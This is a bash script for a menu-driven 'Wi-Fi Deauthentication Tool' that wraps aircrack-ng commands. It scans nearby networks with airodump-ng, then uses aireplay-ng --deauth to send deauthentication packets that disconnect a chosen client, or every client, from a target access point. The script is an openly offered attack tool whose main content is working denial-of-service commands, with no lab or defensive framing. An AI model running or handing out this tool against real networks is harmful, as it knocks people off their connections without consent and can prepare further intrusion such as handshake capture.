#!/bin/bash

display_menu() {
    echo "------------------------------------"
    echo "Wi-Fi Deauthentication Tool"
    echo "1. Scan for Wi-Fi networks"
    echo "2. Select a Wi-Fi network for further actions"
    echo "3. Deauthenticate a client from a Wi-Fi network"
    echo "4. Deauthenticate all clients from a Wi-Fi network"
    echo "5. Check Wi-Fi Adapter Status"
    echo "6. Change Wi-Fi Adapter Interface Name"
    echo "7. Exit"
    echo ""
    echo "Enter your choice:"
    read choice
}

scan_wifi() {
    echo "Scanning for Wi-Fi networks..."
    airodump-ng $wifi_interface
}

select_wifi() {
    echo "Enter the BSSID of the Wi-Fi network:"
    read wifi_bssid
    echo "Enter the channel of the Wi-Fi network:"
    read channel
    echo "Starting monitoring on the selected network..."
    airodump-ng --bssid $wifi_bssid --channel $channel $wifi_interface
}

deauth_client() {
    echo "Enter the number of deauthentication packets to send:"
    read deauth_packets
    echo "Enter the BSSID of the Wi-Fi network:"
    read wifi_bssid
    echo "Enter the client MAC address to deauthenticate:"
    read client_mac
    echo "Sending deauthentication packets..."
    aireplay-ng --deauth $deauth_packets -a $wifi_bssid -c $client_mac $wifi_interface
}

deauth_all_clients() {
    echo "Enter the number of deauthentication packets to send:"
    read deauth_packets
    echo "Enter the BSSID of the Wi-Fi network:"
    read wifi_bssid
    echo "Sending deauthentication packets to all clients..."
    aireplay-ng --deauth $deauth_packets -a $wifi_bssid $wifi_interface
}

check_wifi() {
    echo "Wi-Fi Adapter Status"
    iwconfig $wifi_interface
}

change_interface() {
    echo "Enter the new Wi-Fi adapter interface name:"
    read new_interface
    wifi_interface=$new_interface
    echo "Wi-Fi adapter interface name changed to $wifi_interface."
}

echo ""

read -p "Press any key to continue..."

wifi_interface="wlan0"

while true; do
    display_menu

    case $choice in
        1)
            scan_wifi
            ;;
        2)
            select_wifi
            ;;
        3)
            deauth_client
            ;;
        4)
            deauth_all_clients
            ;;
        5)
            check_wifi
            ;;
        6)
            change_interface
            ;;
        7)
            echo "Exiting..."
            break
            ;;
        *)
            echo "Invalid choice. Please try again."
            ;;
    esac

    echo
done
